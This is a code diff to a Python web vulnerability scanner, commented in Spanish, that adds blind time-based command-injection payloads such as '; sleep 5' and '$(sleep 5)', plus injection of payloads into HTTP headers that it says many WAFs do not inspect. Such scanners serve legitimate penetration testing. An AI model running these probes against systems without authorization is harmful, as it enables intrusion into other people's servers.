@@ -11,6 +11,11 @@ import urllib3
 import threading
 import sys
 import os
+try:
+    from scanners.throttle import request_throttle
+except ImportError:
+    from throttle import request_throttle
+
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 from vulnerability_manager import vuln_manager
 
@@ -53,6 +58,31 @@ rce_params = [
 ]
 
 _RCE_ECHO_MARKER = "3141592653589793"
+
+# Payloads time-based para blind RCE (el output no se refleja en el response)
+_RCE_TIME_PAYLOADS: list = [
+    "; sleep 5",
+    "| sleep 5",
+    "&& sleep 5",
+    "; ping -c 5 127.0.0.1",
+    "| ping -c 5 127.0.0.1",
+    "`sleep 5`",
+    "$(sleep 5)",
+    ";sleep${IFS}5",
+    "1; sleep 5 --",
+]
+_RCE_TIME_THRESHOLD = 4.5   # segundos — umbral para considerar delay real
+
+# Headers inyectables — vectores frecuentes que muchos WAF no inspeccionan
+_RCE_INJECTABLE_HEADERS: list = [
+    "User-Agent",
+    "X-Forwarded-For",
+    "Referer",
+    "X-Real-IP",
+    "X-Forwarded-Host",
+    "X-Client-IP",
+    "CF-Connecting-IP",
+]
 
 def is_rce_response(text):
     """Detecta output REAL de comandos del sistema.
@@ -143,7 +173,11 @@ def _param_reflects_marker(method: str, url: str, all_params: dict, target_param
 def rce(urip, urif, wordlist, urls_vulnerables, threads, custom_headers, random_agent):
     print('\033[1;36m<<<<<<<<<<<<\033[0m Testing Remote Code Execution \033[1;36m>>>>>>>>>>>>>>\033[0m')
     print()
-    total_tasks = (len(urip) * 2 + len(urif)) * len(wordlist)
+    total_tasks = (
+        len(urip) * 3 * len(wordlist)           # GET + POST + BLIND-TIME (urip)
+        + (len(urip) + len(urif)) * min(3, len(wordlist))  # HEADER injection
+        + len(urif) * len(wordlist)              # FORM
+    )
     current = 0
     found = []
     lock = threading.Lock()
@@ -188,6 +222,7 @@ def rce(urip, urif, wordlist, urls_vulnerables, threads, custom_headers, random_
             return ""  # Cualquier otro error
 
     def test_url(url, payload):
+        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
         nonlocal current
         parsed = urlparse(url)
         base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
@@ -288,6 +323,7 @@ def rce(urip, urif, wordlist, urls_vulnerables, threads, custom_headers, random_
             update_progress(current, total_tasks)
 
     def test_post(url, payload):
+        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
         nonlocal current
         parsed = urlparse(url)
         base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
@@ -360,6 +396,7 @@ def rce(urip, urif, wordlist, urls_vulnerables, threads, custom_headers, random_
             update_progress(current, total_tasks)
 
     def test_form(url, payload):
+        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
         nonlocal current
         try:
             # Cache de formularios para evitar re-parsing
@@ -448,11 +485,129 @@ def rce(urip, urif, wordlist, urls_vulnerables, threads, custom_headers, random_
             current += 1
             update_progress(current, total_tasks)
 
+    def _report_rce(method_label, url, param_or_header, payload, technique=""):
+        """Centraliza el reporte de RCE para evitar duplicados entre funciones."""
+        nonlocal current
+        parsed_r = urlparse(url)
+        base = f"{parsed_r.scheme}://{parsed_r.netloc}{parsed_r.path}"
+        with lock:
+            if base in vulnerable_endpoints:
+                return False
+            vulnerable_endpoints.add(base)
+        vuln_manager.mark_as_exploited(base, base_url_only=True)
+        encoded = quote(payload, safe='')
+        label = f"[{method_label}]" + (f"[{technique}]" if technique else "") + "[VULNERABLE]"
+        with stdout_lock:
+            print_vulnerability(f"\033[1;32m{label}\033[0m {base} \033[2m({param_or_header}={encoded})\033[0m")
+        entry = f"{base}?__header_{param_or_header}__={encoded}" if "HEADER" in method_label else f"{base}?{param_or_header}={encoded}"
+        if technique:
+            entry += f"|||BYPASS_TECHNIQUE:{technique}|||BYPASS_ORIGINAL:{quote(payload, safe='')}"
+        urls_vulnerables.append(entry)
+        return True
+
+    def test_headers_rce(url, payload):
+        """Prueba RCE inyectando el payload en headers HTTP comunes."""
+        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
+        nonlocal current
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        if _is_static_path(url) or base_url in vulnerable_endpoints:
+            with lock:
+                current += 1
+                update_progress(current, total_tasks)
+            return
+
+        if ban.is_banned(parsed.netloc):
+            with lock:
+                current += 1
+                update_progress(current, total_tasks)
+            return
+
+        base_headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
+
+        for hdr in _RCE_INJECTABLE_HEADERS:
+            if base_url in vulnerable_endpoints:
+                break
+            try:
+                injected = dict(base_headers)
+                injected[hdr] = payload
+                r = requests.get(base_url, headers=injected, verify=False, timeout=5)
+                ban.record(parsed.netloc, r.status_code, r, base_url)
+                if r.status_code == 200 and is_rce_response(r.text):
+                    _report_rce("HEADER-GET", base_url, hdr, payload)
+                    break
+                # Intentar POST también para Referer/User-Agent
+                rp = requests.post(base_url, headers=injected, verify=False, timeout=5)
+                if rp.status_code == 200 and is_rce_response(rp.text):
+                    _report_rce("HEADER-POST", base_url, hdr, payload)
+                    break
+            except Exception:
+                continue
+
+        with lock:
+            current += 1
+            update_progress(current, total_tasks)
+
+    def test_blind_time(url, payload):
+        """Detecta Blind RCE via time-delay: si el response tarda ≥4.5s es RCE."""
+        nonlocal current
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+        qs = parse_qs(parsed.query)
+
+        if _is_static_path(url) or base_url in vulnerable_endpoints:
+            with lock:
+                current += 1
+                update_progress(current, total_tasks)
+            return
+
+        if ban.is_banned(parsed.netloc):
+            with lock:
+                current += 1
+                update_progress(current, total_tasks)
+            return
+
+        headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
+        # Usar solo parámetros con nombres sugestivos para no sobrecargar
+        params_to_test = [p for p in qs if p.lower() in {pn.lower() for pn in rce_params}] if qs else []
+
+        for param in params_to_test:
+            if base_url in vulnerable_endpoints:
+                break
+            for tp in _RCE_TIME_PAYLOADS:
+                try:
+                    import time
+                    data = {k: tp if k == param else "TEST123" for k in qs}
+                    t0 = time.monotonic()
+                    r = requests.get(base_url, params=data, headers=headers,
+                                     verify=False, timeout=_RCE_TIME_THRESHOLD + 2)
+                    elapsed = time.monotonic() - t0
+                    if elapsed >= _RCE_TIME_THRESHOLD and r.status_code == 200:
+                        # Confirmación: re-enviar para descartar lentitud del servidor
+                        t1 = time.monotonic()
+                        requests.get(base_url, params={k: "TEST123" for k in qs},
+                                     headers=headers, verify=False, timeout=5)
+                        baseline_time = time.monotonic() - t1
+                        if elapsed >= baseline_time + _RCE_TIME_THRESHOLD * 0.6:
+                            _report_rce("GET", base_url, param, tp, "BLIND-TIME-BASED")
+                            break
+                except Exception:
+                    continue
+
+        with lock:
+            current += 1
+            update_progress(current, total_tasks)
+
     def _iter_rce_tasks():
         for url in urip:
             for payload in wordlist:
                 yield (test_url, url, payload)
                 yield (test_post, url, payload)
+                yield (test_blind_time, url, payload)
+        for url in urip + urif:
+            for payload in wordlist[:3]:  # Solo top-3 payloads en headers para no sobrecargar
+                yield (test_headers_rce, url, payload)
         for url in urif:
             for payload in wordlist:
                 yield (test_form, url, payload)
